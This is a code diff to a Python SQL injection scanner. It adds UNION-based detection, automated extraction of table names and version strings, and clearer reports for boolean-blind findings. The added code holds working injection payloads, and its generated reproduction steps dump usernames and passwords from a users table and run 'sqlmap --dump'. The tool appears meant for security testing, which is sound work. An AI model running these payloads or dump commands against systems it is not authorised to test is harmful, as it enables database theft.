@@ -175,6 +175,7 @@ class SQLiScanner(BaseModule):
 
         finding = (
             self._test_error_based(url, method, params, param_name, baseline_text)
+            or self._test_union_based(url, method, params, param_name, baseline_text)
             or self._test_boolean_based(url, method, params, param_name)
             or self._test_time_based(url, method, params, param_name)
             or self._test_orm_injection(url, method, params, param_name, baseline_text)
@@ -310,6 +311,233 @@ class SQLiScanner(BaseModule):
                     ),
                 )
         return None
+
+    # ------------------------------------------------------------------
+    # Strategy 1b: UNION-based (in-band extraction — solid, visible proof)
+    # ------------------------------------------------------------------
+
+    def _test_union_based(
+        self,
+        url: str,
+        method: str,
+        params: Dict[str, str],
+        param_name: str,
+        baseline_text: str = "",
+    ) -> Optional[Finding]:
+        """Confirm SQLi by making the database RETURN attacker-chosen data.
+
+        This is the proof a human can actually see: instead of "the response was
+        37 bytes shorter" (blind/boolean), we get the DB to print real values
+        (table names, version, dumped rows) straight into the page.
+
+        Anti-false-positive oracle — the hard part:
+            The injected payload is usually reflected back in the page (search
+            boxes echo the query). So we can't just look for our marker — we'd
+            match the *reflection*, not real execution. Instead we inject a marker
+            built by SQL string concatenation, e.g.  'qxab'||'cdef'  (or
+            CONCAT('qxab','cdef') on MySQL). Only a database that EXECUTED the
+            query produces the joined value 'qxabcdef'. The reflected payload
+            still shows the pipes/CONCAT, never the joined token. So finding the
+            joined token = proof of execution, immune to reflection.
+        """
+        import random as _r
+        import string as _s
+
+        # --- Cheap injectability gate (2 requests) ---
+        # A single quote breaks SQL syntax; a doubled quote ('') is balanced and
+        # behaves like normal input. If the two responses differ (size or status),
+        # the quote is reaching the SQL engine → worth the heavier UNION search.
+        # If they're identical AND no server error, the param almost certainly
+        # isn't in a SQL string context — skip the ~100 UNION probes entirely.
+        q1 = self._send(url, method, self._append(params, param_name, "'"))
+        q2 = self._send(url, method, self._append(params, param_name, "''"))
+        if q1 is not None and q2 is not None:
+            size_delta = abs(len(q1.text) - len(q2.text))
+            base_len = max(1, len(q2.text))
+            same_status = q1.status_code == q2.status_code
+            no_error = q1.status_code < 500
+            if same_status and no_error and size_delta <= max(15, int(base_len * 0.02)):
+                logger.debug(
+                    "[SQLi/UNION] %s: quote has no effect (' == '') — skipping UNION",
+                    param_name,
+                )
+                return None
+
+        orig = params.get(param_name, "")
+        t1 = "".join(_r.choices(_s.ascii_lowercase, k=4))
+        t2 = "".join(_r.choices(_s.ascii_lowercase, k=4))
+        joined = t1 + t2  # appears ONLY if the DB concatenated → executed
+
+        # (dialect_label, marker-builder, extraction expressions to try after)
+        dialects = [
+            ("pipe", lambda a, b: f"'{a}'||'{b}'", [
+                "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
+                "sqlite_version()",
+                "(SELECT group_concat(table_name) FROM information_schema.tables)",
+                "version()",
+            ]),
+            ("concat", lambda a, b: f"CONCAT('{a}','{b}')", [
+                "(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())",
+                "version()",
+            ]),
+        ]
+        # Injection contexts (string / numeric / parenthesised) and comment styles.
+        # Trimmed to the highest-yield few: the search space is cols × dialects ×
+        # prefixes × fillers, so every extra prefix multiplies request cost against
+        # what is often a single-threaded target.
+        prefixes = [
+            "{orig}' UNION SELECT {cols}-- -",
+            "{orig}) UNION SELECT {cols}-- -",
+            "-1 UNION SELECT {cols}-- -",
+            '{orig}" UNION SELECT {cols}-- -',
+        ]
+        max_cols = 8
+        # Filler values for the non-marker columns. Many real apps render each
+        # UNION row through a template that expects specific column TYPES (e.g. a
+        # numeric price). A NULL or a string in a numeric column makes that render
+        # crash (HTTP 500) even though the injection worked — so we put our string
+        # marker in ONE column and fill the rest with type-compatible dummies,
+        # trying a numeric filler first (covers price/id columns) then a string.
+        fillers = ["1", "'okr'"]
+        # Hard request budget so a param that passes the cheap gate but isn't
+        # actually UNION-injectable can't explode into hundreds of requests.
+        budget = 80
+        sent = 0
+
+        # n in the OUTER loop with dialect/prefix/filler inner means the common
+        # case (correct column count, first dialect/prefix) is hit within a few
+        # requests, while both DB dialects still get a chance at every n.
+        for n in range(1, max_cols + 1):
+            for d_label, mk, extractors in dialects:
+                marker = mk(t1, t2)
+                col_variants = (
+                    [",".join([marker] + [f] * (n - 1)) for f in fillers]
+                    if n > 1 else [marker]
+                )
+                for cols in col_variants:
+                    for tpl in prefixes:
+                        if sent >= budget:
+                            logger.debug("[SQLi/UNION] %s: budget exhausted", param_name)
+                            return None
+                        payload = tpl.format(orig=orig, cols=cols)
+                        resp = self._send(url, method, self._replace(params, param_name, payload))
+                        sent += 1
+                        if resp is None:
+                            continue
+                        body = resp.text or ""
+                        # Execution proof: joined token present AND not in baseline.
+                        if joined in body and joined not in baseline_text:
+                            logger.debug(
+                                "[SQLi/UNION] %s: confirmed — %d cols, dialect=%s, prefix=%r",
+                                param_name, n, d_label, tpl,
+                            )
+                            extracted = self._union_extract(
+                                url, method, params, param_name, tpl, n, mk, t1, t2, extractors,
+                            )
+                            return self._make_union_finding(
+                                url, method, params, param_name, payload, n, d_label,
+                                joined, extracted,
+                            )
+        return None
+
+    def _union_extract(
+        self, url, method, params, param_name, tpl, n, mk, t1, t2, extractors,
+    ) -> Optional[str]:
+        """Pull real data out via UNION, wrapped in our markers so we can locate it.
+
+        We place  t1 || (<expr>) || t2  in the first column so the extracted value
+        lands between two known tokens; then we slice it out of the response.
+        Returns the extracted string (e.g. comma-separated table names) or None.
+        """
+        for expr in extractors:
+            # Build: t1 || (expr) || t2  in col 0 so the loot lands between markers;
+            # type-compatible fillers in the rest (same reason as the detection
+            # phase — NULL/string in a numeric column would crash the row render).
+            first_col = f"'{t1}'||({expr})||'{t2}'" if "||" in mk("a", "b") \
+                else f"CONCAT('{t1}',({expr}),'{t2}')"
+            for filler in ("1", "'okr'"):
+                cols = ",".join([first_col] + [filler] * (n - 1)) if n > 1 else first_col
+                payload = tpl.format(orig=params.get(param_name, ""), cols=cols)
+                resp = self._send(url, method, self._replace(params, param_name, payload))
+                if resp is None:
+                    continue
+                data = self._extract_between(resp.text or "", t1, t2)
+                if data:
+                    return data
+        return None
+
+    @staticmethod
+    def _extract_between(text: str, t1: str, t2: str) -> Optional[str]:
+        """Return the substring the DB placed between markers t1…t2 (the loot)."""
+        # Look for t1<DATA>t2 where DATA is the extracted value (not the literal
+        # reflected payload, which would contain quotes/|| between the tokens).
+        for m in re.finditer(re.escape(t1) + r"(.*?)" + re.escape(t2), text, re.DOTALL):
+            chunk = m.group(1)
+            # Skip the reflected payload itself (contains our SQL syntax).
+            if "||" in chunk or "CONCAT(" in chunk.upper() or "SELECT" in chunk.upper():
+                continue
+            chunk = chunk.strip()
+            if chunk:
+                return chunk[:300]
+        return None
+
+    def _make_union_finding(
+        self, url, method, params, param_name, payload, n_cols, dialect,
+        joined, extracted,
+    ) -> Finding:
+        proof = (
+            f"Extracted live data via UNION: {extracted!r}"
+            if extracted else
+            f"Database executed our injected UNION SELECT and printed the computed "
+            f"value {joined!r} into the page"
+        )
+        loot_line = (
+            f"#    -> The database returned: {extracted}\n"
+            if extracted else
+            f"#    -> The page now contains '{joined}', which only exists if the DB ran our query.\n"
+        )
+        return Finding(
+            vuln_type="SQL Injection (UNION-based, in-band)",
+            url=url,
+            method=method,
+            parameter=param_name,
+            payload=payload,
+            evidence=(
+                f"{proof}. The {param_name!r} parameter is injectable; a {n_cols}-column "
+                f"UNION SELECT ({dialect} dialect) returns attacker-controlled rows."
+            ),
+            # In-band data extraction is the strongest SQLi signal there is.
+            confidence="high",
+            details=(
+                f"In plain terms: the '{param_name}' field is plugged directly into a SQL "
+                f"query, and we were able to bolt on our OWN query with UNION SELECT and "
+                f"make the database hand back whatever we ask for"
+                + (f" — here it returned: {extracted}." if extracted else ".") + "\n"
+                f"This is NOT a guess based on response size — the database literally "
+                f"printed our requested data into the page, which is undeniable proof.\n"
+                f"Why it matters: an attacker can dump any table — users, password "
+                f"hashes, orders, secrets — from this one input.\n"
+                f"Fix: use parameterised queries / prepared statements so input is sent "
+                f"as data, never concatenated into the SQL text."
+            ),
+            reproduction=(
+                f"# --- How to see it for yourself (in-band UNION dump) ---\n"
+                f"# 1. The query has {n_cols} column{'s' if n_cols != 1 else ''}. "
+                f"Send this value in '{param_name}':\n"
+                f"#        {payload}\n"
+                f"# 2. Load the page / run the curl below and read the output:\n"
+                + loot_line +
+                f"# 3. Now dump a real table (example — adjust table/column names):\n"
+                f"#    {param_name}={params.get(param_name,'')}' UNION SELECT "
+                f"{'username,password' + ',NULL' * max(0, n_cols - 2) if n_cols >= 2 else 'username'} "
+                f"FROM users-- -\n"
+                f"# 4. The usernames/passwords appear right in the page. That is a full\n"
+                f"#    database read through one input field.\n"
+                f"{build_curl_command(url, method, params, param_name, payload)}\n"
+                f"# Or let sqlmap automate the dump:\n"
+                f"$ sqlmap -u \"{url}\" -p {param_name} --batch --dump"
+            ),
+        )
 
     # ------------------------------------------------------------------
     # Strategy 2: Boolean-based blind
@@ -499,6 +727,15 @@ class SQLiScanner(BaseModule):
             )
             curl_true = build_curl_command(url, method, {param_name: ""}, param_name, true_pl)
             curl_false = build_curl_command(url, method, {param_name: ""}, param_name, false_pl)
+            # Concrete proof: show the actual VISIBLE content that appears under the
+            # always-true condition and vanishes under always-false — far more
+            # convincing than a byte count.
+            visible = self._visible_diff_sample(r_true.text, r_false.text)
+            visible_note = (
+                f" The always-TRUE page shows content that the always-FALSE page "
+                f"does not, e.g.: {visible!r}."
+                if visible else ""
+            )
             return Finding(
                 vuln_type="SQL Injection (Boolean-based Blind)",
                 url=url,
@@ -506,26 +743,72 @@ class SQLiScanner(BaseModule):
                 parameter=param_name,
                 payload=f"TRUE: {true_pl!r}  /  FALSE: {false_pl!r}",
                 evidence=(
-                    f"Response length: TRUE={t_len} B, FALSE={f_len} B "
-                    f"(diff={diff} B, baseline={baseline_len} B, pattern={kind})"
+                    f"Same input, one logical tweak, two different pages: the always-true "
+                    f"condition returned {t_len} B and the always-false condition {f_len} B "
+                    f"(baseline {baseline_len} B, pattern={kind})."
+                    + visible_note
                 ),
                 confidence="medium",
                 details=(
-                    f"Boolean-based blind SQLi ({kind} pattern). "
-                    f"Baseline: {baseline_len} B | TRUE: {t_len} B | FALSE: {f_len} B. "
-                    "Remediation: use parameterised queries / prepared statements."
+                    f"In plain terms: the '{param_name}' value goes into a SQL query. We "
+                    f"sent two versions that are identical except for a condition that is "
+                    f"always TRUE ({true_pl!r}) vs always FALSE ({false_pl!r}). The page "
+                    f"changed between them, which only happens if the database is "
+                    f"evaluating our condition — i.e. our input reaches the SQL engine.\n"
+                    f"This is 'blind' SQLi: the page doesn't print data directly, so proof "
+                    f"comes from the page reacting to true/false logic"
+                    + (f" (visible change: {visible!r})" if visible else "") + ".\n"
+                    f"Note: blind SQLi can still be escalated to a full data dump (the "
+                    f"scanner tries UNION first; if that had worked you'd see exact data "
+                    f"instead). Confirm/exploit with sqlmap.\n"
+                    f"Fix: use parameterised queries / prepared statements."
                 ),
                 reproduction=(
-                    f"# 1. Send the TRUE condition and note the response size:\n"
+                    f"# --- Why this proves SQL injection (read slowly) ---\n"
+                    f"# The two requests below are the SAME except for the logic at the end:\n"
+                    f"#   TRUE  condition: {true_pl}\n"
+                    f"#   FALSE condition: {false_pl}\n"
+                    f"# A normal app ignores both and returns the same page. A vulnerable\n"
+                    f"# app runs them as SQL, so the page CHANGES between true and false.\n"
+                    f"#\n"
+                    f"# 1. Send the always-TRUE version:\n"
                     f"{curl_true}\n"
-                    f"# 2. Send the FALSE condition and compare:\n"
+                    f"#    -> returns ~{t_len} bytes"
+                    + (f" and INCLUDES: {visible!r}\n" if visible else "\n") +
+                    f"# 2. Send the always-FALSE version:\n"
                     f"{curl_false}\n"
-                    f"# 3. If TRUE returns ~{t_len} bytes and FALSE returns ~{f_len} bytes,\n"
-                    f"#    the difference ({diff} bytes) confirms blind SQLi.\n"
-                    f"# 4. Pipe through 'wc -c' to count bytes:\n"
-                    f"$ # {curl_true.lstrip('$ ')} | wc -c"
+                    f"#    -> returns ~{f_len} bytes"
+                    + (f" and is MISSING that content\n" if visible else "\n") +
+                    f"# 3. Different result for true vs false = the database is running our\n"
+                    f"#    input. Confirmed blind SQL injection.\n"
+                    f"# 4. Dump the data automatically:\n"
+                    f"$ sqlmap -u \"{url}\" -p {param_name} --batch --dump"
                 ),
             )
+        return None
+
+    @staticmethod
+    def _visible_diff_sample(true_text: str, false_text: str) -> Optional[str]:
+        """Return a short, human-readable line that is present in the TRUE page
+        but absent from the FALSE page (concrete evidence of the logic change).
+
+        We compare visible-ish lines and return the first meaningful one that the
+        FALSE response lacks, so the report can say 'you literally see X appear'.
+        """
+        if not true_text:
+            return None
+        false_text = false_text or ""
+        # Strip tags crudely to compare visible text lines.
+        def _lines(html: str):
+            txt = re.sub(r"<[^>]+>", " ", html)
+            return [ln.strip() for ln in re.split(r"[\n\r]+", txt) if len(ln.strip()) >= 8]
+        true_lines = _lines(true_text)
+        false_set = set(_lines(false_text))
+        for ln in true_lines:
+            if ln not in false_set and not ln.lower().startswith(("http", "<!--")):
+                # Avoid boilerplate that's just whitespace/punctuation.
+                if any(c.isalnum() for c in ln):
+                    return ln[:120]
         return None
 
     # ------------------------------------------------------------------
